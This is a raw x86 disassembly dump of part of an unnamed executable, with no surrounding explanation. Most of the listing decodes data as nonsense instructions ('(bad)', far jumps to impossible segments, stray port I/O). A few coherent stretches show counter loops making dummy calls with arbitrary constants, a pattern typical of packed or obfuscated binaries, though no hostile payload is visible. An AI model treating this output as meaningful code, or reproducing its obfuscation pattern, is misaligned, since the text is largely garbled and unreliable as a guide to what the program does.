  4051e0:	sub    BYTE PTR [eax-0x5e],cl
  4051e3:	cmp    BYTE PTR [ecx+ebx*2+0x5d],0x8f
  4051e8:	cwde   
  4051e9:	(bad)  
  4051eb:	(bad)  
  4051ec:	(bad)  
  4051ee:	test   eax,0x9026f692
  4051f3:	data16 scas al,BYTE PTR es:[edi]
  4051f5:	or     cl,0xf2
  4051f8:	mov    cl,0xa4
  4051fa:	fldenv [esi+0x66]
  4051fd:	push   ds
  4051fe:	adc    DWORD PTR [edi],esi
  405200:	test   al,0x19
  405202:	sbb    cl,BYTE PTR [esp+edx*8-0x3f]
  405206:	iret   
  405207:	cli    
  405208:	iret   
  405209:	loopne 0x405199
  40520b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40520c:	or     BYTE PTR [ecx],dh
  40520e:	mov    ds:0xc911491f,al
  405213:	push   ds
  405214:	rcr    BYTE PTR [ebp+0x70],1
  405217:	retf   0x2916
  40521a:	retf   0x361
  40521d:	cmp    ebx,DWORD PTR [ebp+0xa]
  405220:	cmp    DWORD PTR [eax-0x17],ecx
  405223:	xchg   ebp,eax
  405224:	mov    esi,0x48ecca6f
  405229:	and    al,ch
  40522b:	cmp    dh,bl
  40522d:	fsubr  st,st(7)
  40522f:	pop    edx
  405230:	inc    ecx
  405231:	jmp    0x504b:0xa293471
  405238:	xchg   esp,eax
  405239:	mov    ds:0x3d31c13c,al
  40523e:	retf   0x57cb
  405241:	test   al,0x13
  405243:	jle    0x405284
  405245:	xchg   esi,eax
  405246:	ss or  al,0xe9
  405249:	cs dec ecx
  40524b:	xchg   DWORD PTR [ebx],edx
  40524d:	nop
  40524e:	or     al,0xb2
  405250:	add    bl,BYTE PTR [edx-0x3f]
  405253:	sub    ah,BYTE PTR [ebp+0x7e]
  405256:	inc    eax
  405257:	prefetch BYTE PTR [esi-0x357493e7]
  40525e:	push   es
  40525f:	lods   al,BYTE PTR ds:[esi]
  405260:	cmp    ah,BYTE PTR [ecx]
  405262:	cmp    bl,BYTE PTR [esi]
  405264:	ret    0x4d58
  405267:	shl    BYTE PTR [edx-0x2a48aed9],cl
  40526d:	jecxz  0x405218
  40526f:	dec    eax
  405270:	mov    WORD PTR [edx-0x9143dff],fs
  405276:	in     eax,0xcf
  405278:	fisub  WORD PTR [edx]
  40527a:	xchg   esp,eax
  40527b:	xchg   DWORD PTR [ebp+0x331c0fe7],edi
  405281:	sbb    eax,esi
  405283:	cmc    
  405284:	shr    DWORD PTR [ebx],0xb3
  405287:	stc    
  405288:	mov    ah,BYTE PTR [edi-0x2fe4e452]
  40528e:	into   
  40528f:	jge    0x4052db
  405291:	xor    DWORD PTR [esi+0x45],esp
  405294:	fwait
  405295:	out    dx,al
  405296:	dec    eax
  405297:	mov    fs,WORD PTR ds:0xd528ad9a
  40529d:	and    dl,BYTE PTR [ebx+eiz*1]
  4052a0:	ja     0x405275
  4052a2:	push   0x60
  4052a4:	rcr    DWORD PTR [edi+0x49746ac2],cl
  4052aa:	daa    
  4052ab:	(bad)  
  4052ac:	lahf   
  4052ad:	xchg   esp,eax
  4052ae:	repz in eax,dx
  4052b0:	data16 xor al,0x87
  4052b3:	adc    dl,BYTE PTR [esi-0x18]
  4052b6:	pop    esi
  4052b7:	loopne 0x405338
  4052b9:	pop    es
  4052ba:	push   0x4b59ab91
  4052bf:	fnstcw WORD PTR [ecx-0x48]
  4052c2:	or     BYTE PTR [edi+0x8192919],bh
  4052c8:	and    bl,bh
  4052ca:	gs inc ecx
  4052cc:	int3   
  4052cd:	sti    
  4052ce:	repz mov esi,0xac3ea777
  4052d4:	retf   0x9f42
  4052d7:	arpl   bx,bp
  4052d9:	inc    edx
  4052da:	daa    
  4052db:	sub    bl,dh
  4052dd:	scas   eax,DWORD PTR es:[edi]
  4052de:	and    al,0xa6
  4052e0:	test   DWORD PTR [edi+0x2502cfc7],ecx
  4052e6:	in     eax,dx
  4052e7:	jecxz  0x4052dc
  4052e9:	pop    ecx
  4052ea:	repnz pop ss
  4052ec:	mov    ds:0xd1dec251,eax
  4052f1:	lea    edx,[esi-0x2a]
  4052f4:	frstor [ebx]
  4052f6:	sub    al,0x4b
  4052f8:	hlt    
  4052f9:	or     edi,esi
  4052fb:	xor    ebp,esi
  4052fd:	fstp   QWORD PTR [edi]
  4052ff:	(bad)  
  405300:	mov    ds:0x96a05470,eax
  405305:	cmp    BYTE PTR [ebx],0x91
  405308:	ficomp DWORD PTR [ecx+ebx*1-0x36]
  40530c:	and    DWORD PTR [edi+0x2479d43e],0xfffffffb
  405313:	nop
  405314:	fs jns 0x4052ec
  405317:	lock ins BYTE PTR es:[edi],dx
  405319:	jo     0x405312
  40531b:	mov    ch,0x9b
  40531d:	push   edi
  40531e:	iret   
  40531f:	lahf   
  405320:	adc    ebp,ecx
  405322:	scas   eax,DWORD PTR es:[edi]
  405323:	fisubr DWORD PTR [eax]
  405325:	jp     0x4052dc
  405327:	ret    
  405328:	sub    al,0xa7
  40532a:	aas    
  40532b:	xchg   DWORD PTR [edi+0x49],eax
  40532e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40532f:	mov    BYTE PTR [ebx],bh
  405331:	adc    cl,BYTE PTR [eax+esi*8]
  405334:	xchg   esi,eax
  405335:	and    al,0x84
  405337:	dec    eax
  405338:	xchg   BYTE PTR [ebp+0x5d],bh
  40533b:	in     al,0xdc
  40533d:	dec    edi
  40533e:	mov    ebx,0x93e66136
  405343:	sub    eax,DWORD PTR [esi]
  405345:	pusha  
  405346:	data16 fidiv DWORD PTR ds:0xd56520c6
  40534d:	sbb    BYTE PTR [ecx+0x30],al
  405350:	outs   dx,BYTE PTR ds:[esi]
  405351:	push   cs
  405352:	or     bl,dl
  405354:	sbb    al,0x4
  405356:	jbe    0x4052f7
  405358:	popf   
  405359:	(bad)  
  40535a:	cmp    BYTE PTR [ebp+0x1dbf3c62],cl
  405360:	jns    0x405341
  405362:	je     0x40536e
  405364:	mov    dl,0x64
  405366:	mov    ah,0xdd
  405368:	test   BYTE PTR [eax-0xc],0x3c
  40536c:	outs   dx,DWORD PTR ds:[esi]
  40536d:	fldenv [edx+0x8]
  405370:	and    edx,DWORD PTR [eax+eiz*1-0x4c]
  405374:	into   
  405375:	and    al,0x69
  405377:	inc    ebp
  405378:	jnp    0x4053cb
  40537a:	pop    edx
  40537b:	xchg   dl,cl
  40537d:	das    
  40537e:	add    edi,DWORD PTR ds:0xb6cd19ef
  405384:	inc    edx
  405385:	jae    0x40533b
  405387:	imul   edx,DWORD PTR [ebx+esi*1],0xf
  40538b:	adc    ecx,DWORD PTR [edx+0x25]
  40538e:	jo     0x405346
  405390:	retf   
  405391:	cld    
  405392:	retf   0xa5ec
  405395:	(bad)  
  405396:	neg    BYTE PTR cs:[ebp+ecx*8+0x61183973]
  40539e:	jl     0x4053fd
  4053a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053a1:	mov    esi,0x12bf6f45
  4053a6:	fsubr  st,st(7)
  4053a8:	icebp  
  4053a9:	jno    0x4053ff
  4053ab:	add    eax,0x4d05825
  4053b0:	dec    esi
  4053b1:	jno    0x405394
  4053b3:	into   
  4053b4:	nop
  4053b5:	(bad)  
  4053b6:	out    0x3f,eax
  4053b8:	pop    edi
  4053b9:	rcr    edi,cl
  4053bb:	mov    ebx,0xcd2524bc
  4053c0:	pop    esi
  4053c1:	mov    bh,0x5d
  4053c3:	and    ecx,DWORD PTR [esi+0x2b871d16]
  4053c9:	xor    eax,DWORD PTR [ebx+0x101bd96d]
  4053cf:	push   esp
  4053d0:	sbb    ebx,DWORD PTR [eax+edx*8+0x77]
  4053d4:	jae    0x405375
  4053d6:	lahf   
  4053d7:	mov    ds:0x4956038b,al
  4053dc:	int3   
  4053dd:	scas   al,BYTE PTR es:[edi]
  4053de:	sub    eax,0x43973cfa
  4053e3:	inc    esp
  4053e4:	xor    cl,0x11
  4053e7:	inc    esi
  4053e8:	test   DWORD PTR ds:[edi],0xe672c10e
  4053ef:	(bad)  
  4053f0:	fidivr WORD PTR [eax]
  4053f2:	sahf   
  4053f3:	and    BYTE PTR [eax+eax*1-0x23],0xce
  4053f8:	call   0x6f250e79
  4053fd:	cmp    eax,0x8ce78a6c
  405402:	(bad)  
  405403:	outs   dx,DWORD PTR ds:[esi]
  405404:	(bad)  
  405405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405406:	xchg   edi,eax
  405407:	xor    al,0x75
  405409:	rcr    DWORD PTR [edx+0x27],1
  40540c:	sbb    BYTE PTR [eax+0x29],0x44
  405410:	xchg   ebp,eax
  405411:	pop    edx
  405412:	aaa    
  405413:	fst    DWORD PTR [edi]
  405415:	popf   
  405416:	cmp    al,0x55
  405418:	int3   
  405419:	sub    eax,0x37a780a3
  40541e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40541f:	xor    eax,0x41f52be8
  405424:	(bad)
  405427:	leave  
  405428:	push   ecx
  405429:	mov    al,0xa9
  40542b:	inc    ecx
  40542c:	repz adc al,0xe8
  40542f:	out    0xc9,al
  405431:	inc    ebx
  405432:	or     BYTE PTR [ebx+0x7b],bl
  405435:	jbe    0x4053ca
  405437:	add    BYTE PTR [ebx+ebx*4],ch
  40543a:	mov    ah,0x1f
  40543c:	xchg   esi,eax
  40543d:	pushf  
  40543e:	fs xchg edx,eax
  405440:	adc    ecx,DWORD PTR [eax]
  405442:	pusha  
  405443:	not    ah
  405445:	xor    DWORD PTR [ebx+0x0],0x13
  405449:	inc    ebx
  40544a:	retf   
  40544b:	es pop edi
  40544d:	jo     0x405424
  40544f:	mov    DWORD PTR [eax+0x62],ebp
  405452:	ret    0xfeb3
  405455:	mov    ebp,0x8826caab
  40545a:	cmp    DWORD PTR [ecx+ecx*8+0x793b7144],ebp
  405461:	ret    
  405462:	leave  
  405463:	jo     0x405401
  405465:	xor    al,0x99
  405467:	hlt    
  405468:	push   edi
  405469:	aam    0xfd
  40546b:	and    cl,cl
  40546d:	push   es
  40546e:	push   esp
  40546f:	jno    0x4054af
  405471:	pop    ecx
  405472:	or     ebx,DWORD PTR [edx+0x1475a5cb]
  405478:	lahf   
  405479:	aam    0x50
  40547b:	int    0x29
  40547d:	ins    BYTE PTR es:[edi],dx
  40547e:	jbe    0x405484
  405480:	dec    esi
  405481:	push   eax
  405482:	xchg   esi,eax
  405483:	dec    ecx
  405484:	js     0x40544e
  405486:	pop    ss
  405487:	popf   
  405488:	out    dx,al
  405489:	les    eax,FWORD PTR [edx+0x57]
  40548c:	(bad)  [edi+0x24]
  40548f:	ret    0x3359
  405492:	mov    ebp,0x6f3ae4ae
  405497:	jmp    0x5fb503d4
  40549c:	out    0xf4,al
  40549e:	in     eax,dx
  40549f:	fisubr WORD PTR [edi+0x25a79c02]
  4054a5:	add    eax,0xed3cfea
  4054aa:	into   
  4054ab:	fs xchg ebp,eax
  4054ad:	and    ebx,DWORD PTR [esi+0x170abdd0]
  4054b3:	and    DWORD PTR [eax+0x54b2d760],ebx
  4054b9:	call   0x16cc:0xf59790c5
  4054c0:	mov    ah,0x2c
  4054c2:	mov    WORD PTR [esi],fs
  4054c4:	inc    eax
  4054c5:	out    0x26,eax
  4054c7:	dec    edi
  4054c8:	or     al,ah
  4054ca:	ja     0x40546d
  4054cc:	dec    eax
  4054cd:	add    edx,ecx
  4054cf:	jmp    0x4063ea
  4054d4:	mov    edx,DWORD PTR [ebp-0x2c]
  4054d7:	mov    edi,DWORD PTR [ebp-0x4]
  4054da:	xor    edx,eax
  4054dc:	movzx  ebx,BYTE PTR ds:0x4337e7
  4054e3:	or     DWORD PTR ds:0x433803,ebx
  4054e9:	xor    edi,eax
  4054eb:	and    DWORD PTR ds:0x4337f3,0x0
  4054f5:	xor    ebx,ebx
  4054f7:	add    ebx,DWORD PTR ds:0x4337f3
  4054fd:	inc    ebx
  4054fe:	mov    DWORD PTR ds:0x4337f3,ebx
  405504:	cmp    DWORD PTR ds:0x4337f3,0x6
  40550b:	jne    0x40552b
  405511:	push   0x1804
  405516:	push   0x80d8
  40551b:	push   0x74bc
  405520:	push   0x5a14
  405525:	call   DWORD PTR ds:0x412370
  40552b:	cmp    DWORD PTR ds:0x4337f3,0x5
  405532:	jne    0x405545
  405538:	mov    ebx,DWORD PTR ds:0x4337f3
  40553e:	inc    ebx
  40553f:	mov    DWORD PTR ds:0x4337f3,ebx
  405545:	cmp    DWORD PTR ds:0x4337f3,0x1e
  40554c:	jb     0x4054f5
  405552:	mov    DWORD PTR ds:0x4337f7,0x387c
  40555c:	add    edi,ecx
  40555e:	add    edx,ecx
  405560:	imul   edx,edi
  405563:	mov    edi,DWORD PTR [ebp-0x8]
  405566:	and    DWORD PTR ds:0x4337b7,0x0
  405570:	mov    ebx,DWORD PTR ds:0x4337b7
  405576:	inc    ebx
  405577:	mov    DWORD PTR ds:0x4337b7,ebx
  40557d:	cmp    DWORD PTR ds:0x4337b7,0x2c
  405584:	jne    0x4055b0
  40558a:	push   DWORD PTR [ebp-0x28]
  40558d:	push   0x7933
  405592:	push   0x433946
  405597:	push   DWORD PTR [ebp-0x28]
  40559a:	push   DWORD PTR [ebp-0x24]
  40559d:	push   DWORD PTR [ebp-0x1c]
  4055a0:	push   0x42e0
  4055a5:	push   0x392f
  4055aa:	call   DWORD PTR ds:0x412374
  4055b0:	cmp    DWORD PTR ds:0x4337b7,0x1e
  4055b7:	jb     0x405570
  4055bd:	mov    ebx,DWORD PTR [ebp-0x10]
  4055c0:	sub    ebx,edi
  4055c2:	cmp    ebx,edx
  4055c4:	ja     0x4055d2
  4055ca:	mov    edx,DWORD PTR [ebp-0x28]
  4055cd:	jmp    0x4063dc
  4055d2:	mov    edx,DWORD PTR [ebp-0x30]
  4055d5:	mov    edi,DWORD PTR [ebp-0x4]
  4055d8:	xor    edx,eax
  4055da:	xor    edi,eax
  4055dc:	add    edi,ecx
  4055de:	add    edx,ecx
  4055e0:	imul   edx,edi
  4055e3:	mov    edi,DWORD PTR [ebp-0x8]
  4055e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4055e9:	sub    ebx,edi
  4055eb:	cmp    ebx,edx
  4055ed:	ja     0x4055fb
  4055f3:	mov    edx,DWORD PTR [ebp-0x2c]
  4055f6:	jmp    0x4063dc
  4055fb:	mov    edx,DWORD PTR [ebp-0x34]
  4055fe:	mov    edi,DWORD PTR [ebp-0x4]
  405601:	xor    edx,eax
  405603:	xor    edi,eax
  405605:	add    edi,ecx
  405607:	add    edx,ecx
  405609:	imul   edx,edi
  40560c:	mov    edi,DWORD PTR [ebp-0x8]
  40560f:	mov    ebx,DWORD PTR [ebp-0x10]
  405612:	sub    ebx,edi
  405614:	cmp    ebx,edx
  405616:	ja     0x40597e
  40561c:	jmp    0x405976
  405621:	(bad)  [eax+0x65]
  405624:	pop    eax
  405625:	jne    0x405698
  405627:	loope  0x405672
  405629:	clc    
  40562a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40562b:	dec    ebp
  40562c:	push   0x62e3a5f1
  405631:	test   eax,0x337e7e37
  405636:	jge    0x4056b6
  405638:	jle    0x405649
  40563a:	adc    al,0x70
  40563c:	dec    edx
  40563d:	pop    ebp
  40563e:	out    0x40,eax
  405640:	and    DWORD PTR [ecx],edi
  405642:	hlt    
  405643:	mov    ds:0xd05d4e87,eax
  405648:	pop    ss
  405649:	dec    eax
  40564a:	fbstp  TBYTE PTR [ebx-0x6b]
  40564d:	rcl    DWORD PTR [esi],1
  40564f:	test   eax,0x12ea3a6d
  405654:	pop    ebx
  405655:	pop    esp
  405656:	inc    esi
  405657:	mov    dl,0x5a
  405659:	push   ebx
  40565a:	daa    
  40565b:	or     al,0x58
  40565d:	cli    
  40565e:	pusha  
  40565f:	or     al,0x27
  405661:	inc    ebp
  405662:	pushf  
  405663:	sbb    DWORD PTR [edx-0x1ed2466a],0x50
  40566a:	mov    ah,0xd8
  40566c:	sbb    esi,DWORD PTR [eax+0x3bf35eaa]
  405672:	lods   al,BYTE PTR ds:[esi]
  405673:	mov    cl,0x69
  405675:	ss push 0xffffffce
  405678:	ret    
  405679:	sub    BYTE PTR [edx],0x8a
  40567c:	or     esp,eax
  40567e:	les    edx,FWORD PTR [ebp-0x70]
  405681:	adc    eax,0xaae3fc7
  405686:	iret   
  405687:	ficom  DWORD PTR [edi-0x816029]
  40568d:	fsubp  st(4),st
  40568f:	repz leave 
  405691:	pushw  ss
  405693:	push   cs
  405694:	(bad)  
  405696:	mov    ch,0x3c
  405698:	cmp    ch,dh
  40569a:	retf   0x20d3
  40569d:	cdq    
  40569e:	jnp    0x405669
  4056a0:	mov    ebx,0x1ca6e1d
  4056a5:	scas   eax,DWORD PTR es:[edi]
  4056a6:	or     cl,bl
  4056a8:	adc    al,0x66
  4056aa:	scas   eax,DWORD PTR es:[edi]
  4056ab:	sbb    DWORD PTR ds:0x668f713f,ebp
  4056b1:	pop    ss
  4056b2:	sbb    DWORD PTR [edx-0x23],esp
  4056b5:	ins    DWORD PTR es:[edi],dx
  4056b6:	inc    eax
  4056b7:	cwde   
  4056b8:	daa    
  4056b9:	or     ebp,DWORD PTR [esi+0x71]
  4056bc:	pop    ds
  4056bd:	adc    al,0xbb
  4056bf:	jae    0x405644
  4056c1:	cmp    eax,0x1278ffa9
  4056c6:	inc    esp
  4056c7:	xor    esi,ecx
  4056c9:	dec    esi
  4056ca:	jbe    0x4056c6
  4056cc:	inc    ebp
  4056cd:	ss xchg ebp,eax
  4056cf:	into   
  4056d0:	sbb    dh,BYTE PTR [ebp-0x7f]
  4056d3:	xor    BYTE PTR [edi+0x6d8e9616],dh
  4056d9:	cmp    DWORD PTR [esp+edx*1+0x12],ebp
  4056dd:	sahf   
  4056de:	cmp    DWORD PTR [edi+0x27],ebp
  4056e1:	push   ss
  4056e2:	icebp  
  4056e3:	ret    0x470c
  4056e6:	pop    esp
  4056e7:	aad    0xd2
  4056e9:	push   0x54
  4056eb:	les    ecx,FWORD PTR [esi+0x48]
  4056ee:	and    esp,esp
  4056f0:	(bad)  
  4056f1:	bswap  esp
  4056f3:	sbb    BYTE PTR [eax],bl
  4056f5:	sar    BYTE PTR [edi+ebx*4-0x5d],cl
  4056f9:	adc    BYTE PTR ds:0xb143bc92,ch
  4056ff:	pop    edx
  405700:	xor    eax,0xa25c0902
  405705:	pop    esp
  405706:	adc    DWORD PTR ds:0x2c57ba4a,edi
  40570c:	inc    BYTE PTR [edi-0xacbd9e3]
  405712:	mov    ch,ch
  405714:	ds push esi
  405716:	xor    al,0x65
  405718:	outs   dx,DWORD PTR ds:[esi]
  405719:	xchg   ebp,eax
  40571a:	push   ebp
  40571b:	test   BYTE PTR [ebx+eiz*2-0x1],bh
  40571f:	lahf   
  405720:	test   eax,0xa1473cdd
  405725:	jecxz  0x40578b
  405727:	jbe    0x4056ad
  405729:	sbb    edi,ebp
  40572b:	cmp    al,BYTE PTR [esi+ebp*4]
  40572e:	xchg   esp,eax
  40572f:	mov    WORD PTR [ecx+0x6f],cs
  405732:	jnp    0x405739
  405734:	js     0x4056cb
  405736:	gs sub bh,dl
  405739:	pushf  
  40573a:	stc    
  40573b:	mov    edx,0xec93bc53
  405740:	(bad)
  405743:	jbe    0x40574b
  405745:	in     eax,0xc4
  405747:	and    BYTE PTR [ebp-0x5b320498],dh
  40574d:	call   0x36fadecc
  405752:	sub    BYTE PTR [edx+eax*1-0x29],ch
  405756:	cld    
  405757:	lds    edi,FWORD PTR [edx+0x7a6fd981]
  40575d:	sub    DWORD PTR [eax+edi*8+0x66],edx
  405761:	jne    0x405790
  405763:	pop    ss
  405764:	test   DWORD PTR [ebp+ebx*8+0x487af4b7],edx
  40576b:	dec    ebx
  40576c:	or     al,0xc6
  40576e:	mov    cl,0xe0
  405770:	call   DWORD PTR [ebx+0x360c7fe2]
  405776:	mov    ds:0x6acb803b,ax
  40577c:	leave  
  40577d:	xor    ch,BYTE PTR [edx-0x33]
  405780:	lds    edi,FWORD PTR [edi]
  405782:	pusha  
  405783:	cmp    edi,DWORD PTR cs:[eax+0x6d790c6c]
  40578a:	mov    dx,0x4720
  40578e:	out    0x8b,eax
  405790:	std    
  405791:	push   esp
  405792:	imul   edx,DWORD PTR [esi-0x45],0xf679c450
  405799:	enter  0x3e23,0x6
  40579d:	enter  0x6999,0x49
  4057a1:	loope  0x4057ac
  4057a3:	dec    eax
  4057a4:	jmp    0xddfc:0x3aa55141
  4057ab:	cli    
  4057ac:	loop   0x405811
  4057ae:	xchg   ecx,eax
  4057af:	fnstenv [ecx+edx*4]
  4057b2:	and    eax,0x37f8646e
  4057b7:	or     eax,0x5fb67a1
  4057bc:	mov    edx,0xce300e73
  4057c1:	mov    ds,WORD PTR es:[eax-0x65]
  4057c5:	pop    edx
  4057c6:	inc    ecx
  4057c7:	dec    esi
  4057c8:	scas   eax,DWORD PTR es:[edi]
  4057c9:	push   esi
  4057ca:	daa    
  4057cb:	push   cs
  4057cc:	mov    edi,DWORD PTR [ebp-0x2176e93b]
  4057d2:	fucomip st,st(0)
  4057d4:	rcr    BYTE PTR [eax],0x5e
  4057d7:	inc    ebp
  4057d8:	sub    eax,DWORD PTR [edx+ebp*8-0x62]
  4057dc:	mov    ebx,0x69429d5f
  4057e1:	mov    eax,0x2b3a2b1e
  4057e6:	test   DWORD PTR [eax-0x66],0xe1698479
  4057ed:	sub    al,0x41
  4057ef:	popa   
  4057f0:	nop
  4057f1:	int3   
  4057f2:	mov    eax,0x229e550e
  4057f7:	adc    dl,dl
  4057f9:	shl    BYTE PTR [ecx+0xff0f548],1
  4057ff:	test   ebx,ecx
  405801:	pushf  
  405802:	fld    QWORD PTR [edi-0x7f0e9b44]
  405808:	nop
  405809:	pop    ds
  40580a:	loop   0x40579d
  40580c:	cmp    BYTE PTR [ebx+ebp*4+0x41],dl
  405810:	fcomip st,st(7)
  405812:	fild   WORD PTR [edx-0x37d04c19]
  405818:	xor    edx,DWORD PTR [edx]
  40581a:	adc    cl,BYTE PTR [ebp+0x4d]
  40581d:	cmc    
  40581e:	clc    
  40581f:	dec    ecx
  405820:	mov    DWORD PTR [edx+0x61a27ff8],eax
  405826:	push   edi
  405827:	cmc    
  405828:	stos   BYTE PTR es:[edi],al
  405829:	push   ecx
  40582a:	out    dx,al
  40582b:	sub    esi,DWORD PTR [ecx+0x1a203874]
  405831:	int    0x44
  405833:	xchg   ebx,eax
  405834:	(bad)  [eax-0x33]
  405837:	mov    ecx,eax
  405839:	scas   eax,DWORD PTR es:[edi]
  40583a:	mov    edi,0x352c5ab0
  40583f:	or     ah,bh
  405841:	pop    ds
  405842:	mov    ebp,0x69f8ccd3
  405847:	nop
  405848:	sar    BYTE PTR [ecx-0x77cdf9f0],cl
  40584e:	loopne 0x405863
  405850:	jge    0x4058a1
  405852:	add    al,0x2e
  405854:	xor    BYTE PTR [ebp-0x5f],cl
  405857:	loopne 0x40581e
  405859:	cmc    
  40585a:	fdiv   st,st(1)
  40585c:	test   al,0x58
  40585e:	adc    bh,BYTE PTR [edi+ecx*1-0xe]
  405862:	mov    ds:0x171cd5e9,al
  405867:	out    dx,eax
  405868:	loop   0x405804
  40586a:	out    0x2,al
  40586c:	jmp    0xf4d6:0x354eb4db
  405873:	out    0xdf,al
  405875:	xor    BYTE PTR [esi+0x7c2b2c10],dh
  40587b:	gs rcl ebp,0xc6
  40587f:	hlt    
  405880:	je     0x4058f9
  405882:	sbb    DWORD PTR [ebx+0xa],edi
  405885:	push   es
  405886:	xchg   ebp,eax
  405887:	dec    ecx
  405888:	imul   edx,DWORD PTR [ecx],0xdcf77b3e
  40588e:	pop    ss
  40588f:	push   cs
  405890:	push   ebx
  405891:	xor    BYTE PTR [eax],dh
  405893:	jb     0x405830
  405895:	sbb    BYTE PTR [ebx],bl
  405897:	mov    dh,0xc2
  405899:	shl    BYTE PTR [esi+0x14],0xfd
  40589d:	and    ch,BYTE PTR [ebp-0x5b]
  4058a0:	daa    
  4058a1:	add    DWORD PTR [edx+0x41155737],esi
  4058a7:	push   ds
  4058a8:	fistp  DWORD PTR [eax]
  4058aa:	bound  esp,QWORD PTR [edi+0xe787972]
  4058b0:	popa   
  4058b1:	dec    esp
  4058b2:	mov    eax,ds:0x60872fc2
  4058b7:	sbb    al,0xd3
  4058b9:	xor    al,0x7a
  4058bb:	das    
  4058bc:	jae    0x40586e
  4058be:	push   es
  4058bf:	mov    dl,0x43
  4058c1:	mov    edi,0xf4664ae5
  4058c6:	aam    0x2f
  4058c8:	sbb    DWORD PTR [esi-0x76a01c1c],esi
  4058ce:	aad    0x8f
  4058d0:	fimul  WORD PTR [esi+edx*8-0x19]
  4058d4:	mov    ah,0x1e
  4058d6:	mov    bh,0x5a
  4058d8:	jg     0x405950
  4058da:	push   es
  4058db:	data16 and BYTE PTR [esi],bh
  4058de:	aaa    
  4058df:	les    esp,FWORD PTR [esi]
  4058e1:	test   dh,dh
  4058e3:	mov    dh,BYTE PTR [eax]
  4058e5:	dec    eax
  4058e6:	mov    bl,0x7c
  4058e8:	mov    dh,0x1c
  4058ea:	push   edi
  4058eb:	cli    
  4058ec:	stos   BYTE PTR es:[edi],al
  4058ed:	mov    edx,0xc0139672
  4058f2:	mov    ecx,0x3f3c904e
  4058f7:	push   ds
  4058f8:	dec    esp
  4058f9:	fisub  DWORD PTR [esi+0x40a9eb20]
  4058ff:	je     0x40591f
  405901:	lahf   
  405902:	sub    eax,0x985aa1ce
  405907:	call   0xe640:0xdc2ab40d
  40590e:	add    al,dh
  405910:	xor    BYTE PTR [ebx],0x3b
  405913:	retf   0xad2a
  405916:	sub    al,0x77
  405918:	pushf  
  405919:	jg     0x405935
  40591b:	sub    eax,DWORD PTR [esi+0x6]
  40591e:	xor    eax,0x59c65421
  405923:	popf   
  405924:	call   0x1934fc43
  405929:	fild   QWORD PTR [ebx-0x3]
  40592c:	mov    ch,BYTE PTR [edi+0x3a]
  40592f:	jge    0x40591d
  405931:	sbb    eax,0xb7b14ea8
  405936:	inc    eax
  405937:	retf   0xbad7
  40593a:	(bad)  
  40593b:	push   0x6fe938ab
  405940:	shr    bh,cl
  405942:	cs lock out dx,eax
  405945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405946:	push   ds
  405947:	jmp    0x4058f2
  405949:	pop    es
  40594a:	add    DWORD PTR [edx],eax
  40594c:	sti    
  40594d:	dec    ebx
  40594e:	leave  
  40594f:	pop    es
  405950:	sub    edx,DWORD PTR [ebp-0x9]
  405953:	scas   eax,DWORD PTR es:[edi]
  405954:	out    0xb5,al
  405956:	pop    ebp
  405957:	push   ss
  405958:	jl     0x4059ab
  40595a:	int    0x38
  40595c:	add    eax,0xf42052e9
  405961:	adc    bl,BYTE PTR es:[ecx+0x53]
  405965:	jb     0x40596a
  405967:	(bad)  
  405968:	lahf   
  405969:	sub    BYTE PTR [ecx+edi*4+0x62],ah
  40596d:	xchg   BYTE PTR [edx-0x5eed1209],al
  405973:	adc    bh,BYTE PTR [edx]
  405975:	or     BYTE PTR [ebx+0x5ee9d055],cl
  40597b:	or     al,BYTE PTR [eax]
  40597d:	add    BYTE PTR [ebx+0x7d8bc855],cl
  405983:	cld    
  405984:	xor    edx,eax
  405986:	xor    edi,eax
  405988:	add    edi,ecx
  40598a:	add    edx,ecx
  40598c:	imul   edx,edi
  40598f:	mov    edi,DWORD PTR [ebp-0x8]
  405992:	mov    ebx,DWORD PTR [ebp-0x10]
  405995:	sub    ebx,edi
  405997:	cmp    ebx,edx
  405999:	ja     0x405d01
  40599f:	jmp    0x405cf9
  4059a4:	push   0x20
  4059a6:	outs   dx,BYTE PTR ds:[esi]
  4059a7:	adc    dh,BYTE PTR [eax+edx*2+0x72]
  4059ab:	pusha  
  4059ac:	cli    
  4059ad:	sar    BYTE PTR [eax+0x5f],1
  4059b0:	pop    edi
  4059b1:	ror    DWORD PTR [ebx],0xae
  4059b4:	push   0x32
  4059b6:	jle    0x405a36
  4059b8:	xor    edi,DWORD PTR [ebp+0x7e]
  4059bb:	jle    0x405959
  4059bd:	sbb    edi,eax
  4059bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059c0:	cmova  ebp,esp
  4059c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059c4:	push   cs
  4059c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059c7:	ss ja  0x40597a
  4059ca:	cwde   
  4059cb:	daa    
  4059cc:	cmp    al,0x14
  4059ce:	bound  ebp,QWORD PTR [edx-0x30363232]
  4059d4:	jnp    0x4059d9
  4059d6:	jmp    0x7a2b:0xf6319ffc
  4059dd:	aad    0x90
  4059df:	enter  0xa478,0x3b
  4059e3:	add    ah,dl
  4059e5:	sub    DWORD PTR [ebx-0x3ef52781],0x1d
  4059ec:	outs   dx,DWORD PTR ds:[esi]
  4059ed:	ror    BYTE PTR [edi],0xc0
  4059f0:	xchg   edx,eax
  4059f1:	cmp    eax,0x82f27e0c
  4059f6:	je     0x405993
  4059f8:	and    DWORD PTR [ebx+0x6b],edi
  4059fb:	std    
  4059fc:	xchg   esi,eax
  4059fd:	push   eax
  4059fe:	out    dx,al
  4059ff:	mov    edi,esp
  405a01:	test   eax,0xfcc7b14
  405a06:	fstp   TBYTE PTR [ecx]
  405a08:	ins    DWORD PTR es:[edi],dx
  405a09:	std    
  405a0a:	and    DWORD PTR [ebp+0x70],esp
  405a0d:	sbb    DWORD PTR [edi+0x778d2ac9],esp
  405a13:	inc    esp
  405a14:	inc    edi
  405a15:	add    eax,0x5eb1223
  405a1a:	pop    ebp
  405a1b:	fdiv   DWORD PTR [eax]
  405a1d:	inc    esp
